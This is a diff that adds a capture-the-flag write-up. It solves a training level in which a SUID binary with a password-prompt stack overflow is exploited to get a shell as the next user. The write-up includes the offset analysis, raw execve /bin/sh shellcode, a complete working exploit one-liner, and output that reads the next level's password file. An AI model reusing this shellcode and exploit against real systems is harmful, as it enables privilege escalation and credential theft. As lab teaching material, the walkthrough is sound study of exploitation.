@@ -1,1 +1,183 @@
-hello flag
+# Level01 — Buffer Overflow & Return Address Overwrite
+
+## Context
+
+Inside the home directory of the `level01` user, we find a binary named `level01`.
+The program implements a two-step authentication system with username and password verification.
+Our objective is to exploit a buffer overflow vulnerability to gain shell access with escalated privileges.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level02 level02   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level02 users   5464 Sep 10  2016 level01
+-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level01` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level02`).
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: admin
+verifying username....
+
+Enter Password: 
+password
+nope, incorrect password...
+```
+
+The program requires a specific username and then validates the password input.
+
+---
+
+## Security Analysis
+
+```bash
+$ checksec --file level01
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01
+```
+
+**Key security features:**
+* **No stack canary** → Stack buffer overflow protection is disabled
+* **NX disabled** → Stack is executable (shellcode execution possible)
+* **No PIE** → Predictable memory addresses
+* **No ASLR** → Memory layout is consistent across runs
+
+---
+
+## Static Analysis (Disassembly)
+
+```bash
+(gdb) disass main
+```
+
+**Key functions identified:**
+* `verify_user_name` - Validates the username input
+* `verify_user_pass` - Validates the password input
+* `main` - Orchestrates the authentication flow
+
+**Critical observations:**
+* Username is stored at `0x804a040` (global variable `a_user_name`)
+* Password input uses `fgets` with a 100-byte buffer limit
+* Local password buffer is allocated on the stack (vulnerable to overflow)
+
+---
+
+## Vulnerability Analysis
+
+### Username Verification Bypass
+
+Testing reveals that the username **"dat_wil"** passes the `verify_user_name` function:
+
+```bash
+$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+```
+
+### Buffer Overflow in Password Input
+
+The password verification uses a stack-allocated buffer that can be overflowed:
+
+```bash
+$ python -c 'print "A" * 200' | ./level01
+# Results in segmentation fault after username verification
+```
+
+**Pattern analysis with cyclic input:**
+```bash
+(gdb) run
+Enter Username: dat_wil
+Enter Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+
+**Return address control confirmed:**
+* Pattern `0x37634136` corresponds to "6Ac7" in the cyclic pattern
+* **Offset calculation:** 80 bytes to reach the return address
+
+---
+
+## Exploitation Strategy
+
+### Step 1: Username Storage Abuse
+
+Since the username is stored in a global buffer at `0x804a040`, we can inject shellcode there:
+
+```bash
+Username: "dat_wil" + NOP_SLED + SHELLCODE
+```
+
+### Step 2: Return Address Overwrite
+
+Overflow the password buffer to control the return address and redirect execution to our shellcode:
+
+```bash
+Password: PADDING (80 bytes) + SHELLCODE_ADDRESS
+```
+
+### Step 3: Shellcode Selection
+
+Using a compact `/bin/sh` shellcode (21 bytes):
+```
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+---
+
+## Payload Construction
+
+```bash
+USERNAME = "dat_wil" + "\x90" * 90 + SHELLCODE
+PASSWORD = "a" * 80 + RETURN_ADDRESS
+```
+
+**Memory layout verification:**
+```bash
+(gdb) x/100x 0x804a040
+0x804a040 <a_user_name>:	0x5f746164	0x906c6977	0x90909090	...
+0x804a0a0 <a_user_name+96>:	0x580b6a90	0x2f685299	0x6868732f	0x6e69622f
+```
+
+**Shellcode located at:** `0x804a080` (within NOP sled)
+
+---
+
+## Exploitation
+
+```bash
+$ (python -c 'print "dat_wil" + "\x90" * 90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "a" * 80 + "\x80\xa0\x04\x08"'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+```
+
+**Result:** Shell access with `level02` privileges obtained!
